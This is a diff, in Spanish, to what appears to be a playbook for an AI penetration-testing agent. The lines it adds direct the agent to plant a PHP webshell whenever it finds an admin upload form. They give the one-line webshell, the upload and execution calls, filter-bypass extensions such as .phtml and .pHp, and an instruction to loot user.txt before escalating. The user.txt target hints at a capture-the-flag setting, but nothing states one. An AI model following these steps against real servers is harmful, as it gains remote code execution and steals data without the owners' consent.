@@ -199,6 +199,28 @@ nexus.cred.bruteforce(
   (`OPTIONS`) y rutas sin autenticar.
 - Un CMS: `nexus.web.wp_enum`, versiones de plugins y `searchsploit`.
 
+#### Regla de subida de archivos (no negociable)
+
+Si entras a un **panel de administración con un formulario de subida de
+archivos** (`<input type="file">`), el paso siguiente **no** es seguir buscando
+contraseñas: es intentar RCE con una webshell. Carga la skill
+`web-upload-webshell` (`nexus.skill.load(name="web-upload-webshell")`) y hazlo
+en cuatro pasos:
+
+1. lee el HTML del formulario y anota el `name` del `<input type="file">`, el
+   `action`/`method`, los `<input type="hidden">` y el botón de envío;
+2. escribe la webshell en el workspace con `nexus.shell.exec` (p. ej.
+   `printf '%s\n' '<?php system($_GET["c"]); ?>' > shell.phtml`);
+3. súbela con `nexus.web.upload(url="http://<host>/<panel>/",
+   upload="shell.phtml", method="POST")` (o con `curl -F` desde
+   `nexus.shell.exec` si el formulario exige campos extra y redirects);
+4. ejecútala con `nexus.web.request(url="http://<host>/uploads/shell.phtml?c=id")`
+   y **loot primero**: `cat /home/*/user.txt` antes de escalar.
+
+Si el filtro rechaza `.php`, repite solo la extensión (`.phtml`, `.php5`, `.pHp`)
+antes de cambiar de vector. Una subida con `200` no prueba nada: la prueba es la
+salida de `id` de la webshell.
+
 ### 7. Checklist de vectores: si el login no cede, cambia de vector
 
 Un login que no cede no cierra la rama: cierra *ese* vector. Antes de pasar al
@@ -216,6 +238,9 @@ siguiente servicio, recorre esta lista:
   vale más que otra wordlist.
 - **Otro parámetro o método**: el mismo endpoint con otro parámetro, `OPTIONS`,
   o la API que sirve el front (`/api/`, `/graphql`, `/swagger.json`).
+- **Subida de archivos**: si el panel (autenticado o no) tiene un formulario de
+  subida, una webshell es RCE directo; sigue la regla de subida de arriba antes
+  de dar el vector por agotado.
 
 Dos intentos del mismo vector sin hechos nuevos son el límite: el tercero es
 presupuesto perdido. Cuando el puerto 80/443 está agotado, documenta el
